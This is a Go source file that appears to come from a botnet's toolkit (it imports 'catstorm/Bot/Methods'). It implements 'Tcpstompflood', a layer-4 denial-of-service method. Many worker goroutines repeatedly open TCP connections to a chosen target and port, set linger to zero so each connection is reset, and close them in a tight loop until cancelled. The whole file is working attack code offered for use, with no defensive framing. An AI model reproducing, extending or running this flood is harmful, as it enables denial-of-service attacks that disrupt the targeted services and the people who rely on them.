package l4

import (
	"context"
	"net"
	"time"
	"catstorm/Bot/Methods"
)

func Tcpstompflood(ctx context.Context, target, port string, sec int) {
	addr := net.JoinHostPort(target, port)
	workers := methods.Workers()

	for w := 0; w < workers; w++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				con, err := net.DialTimeout("tcp", addr, 2*time.Second)
				if err == nil {
					if tcp, ok := con.(*net.TCPConn); ok {
						tcp.SetLinger(0)
					}
					con.Close()
				}
				con2, err2 := net.DialTimeout("tcp", addr, 2*time.Second)
				if err2 == nil {
					if tcp, ok := con2.(*net.TCPConn); ok {
						tcp.SetLinger(0)
					}
					con2.Close()
				}
				if err != nil && err2 != nil {
					time.Sleep(10 * time.Millisecond)
				}
			}
		}()
	}
	<-ctx.Done()
}
